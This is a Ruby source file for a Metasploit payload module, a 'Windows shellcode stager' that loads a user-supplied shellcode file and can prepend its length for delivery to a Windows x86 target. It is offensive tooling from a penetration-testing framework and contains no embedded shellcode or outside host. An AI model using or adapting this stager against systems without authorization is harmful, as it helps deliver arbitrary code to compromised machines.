##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  include Msf::Payload::Windows
  include Msf::Payload::Custom
  include Msf::Payload::Custom::Options

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Windows shellcode stager',
        'Description' => 'Custom shellcode stager',
        'Author' => 'bwatters-r7',
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => ARCH_X86,
        'Session' => nil,
        'PayloadCompat' => {}
      )
    )
  end

  def stage_payload(_opts = {})
    print_line('Trying to stage Payload')
    unless datastore['SHELLCODE_FILE'].nil?
      shellcode = File.binread(datastore['SHELLCODE_FILE'])
      if datastore['PrependSize']
        return [ shellcode.length ].pack('V') + shellcode
      else
        return shellcode
      end
    end
  end
end
